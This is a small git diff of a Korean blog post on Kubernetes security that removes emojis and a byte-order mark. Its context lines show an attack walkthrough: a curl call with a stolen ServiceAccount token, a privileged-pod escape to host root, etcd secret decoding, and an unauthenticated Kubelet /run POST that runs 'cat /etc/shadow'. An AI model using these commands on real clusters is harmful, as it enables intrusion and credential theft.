@@ -1,4 +1,4 @@
-﻿---
+---
 layout: post
 title: "Kubernetes"
 date: 2025-12-05 17:00:00 +0900
@@ -543,7 +543,7 @@ curl -k -H "Authorization: Bearer $TOKEN" \
 # 4. 권한이 있다면 모든 Secret(비밀번호, API키) 탈취 가능
 ```
 
-**[공격 결과]**: Pod 침투 → ServiceAccount 권한으로 클러스터 API 접근 🔓
+**[공격 결과]**: Pod 침투 → ServiceAccount 권한으로 클러스터 API 접근
 
 ---
 
@@ -583,7 +583,7 @@ whoami  # root (호스트)
 cat /etc/shadow
 ```
 
-**[공격 결과]**: Pod 생성 권한 → 노드 루트 획득 → 클러스터 전체 위협 🔓
+**[공격 결과]**: Pod 생성 권한 → 노드 루트 획득 → 클러스터 전체 위협
 
 ---
 
@@ -608,7 +608,7 @@ echo "cGFzc3dvcmQxMjM=" | base64 -d
 # password123
 ```
 
-**[공격 결과]**: etcd 접근 → 모든 Secret(DB 비밀번호, TLS 키 등) 노출 🔓
+**[공격 결과]**: etcd 접근 → 모든 Secret(DB 비밀번호, TLS 키 등) 노출
 
 ---
 
@@ -630,7 +630,7 @@ curl -k -X POST "https://<node-ip>:10250/run/<namespace>/<pod-name>/<container-n
   -d "cmd=cat /etc/shadow"
 ```
 
-**[공격 결과]**: 노드 Kubelet 접근 → 해당 노드의 모든 Pod 제어 🔓
+**[공격 결과]**: 노드 Kubelet 접근 → 해당 노드의 모든 Pod 제어
 
 ---
 
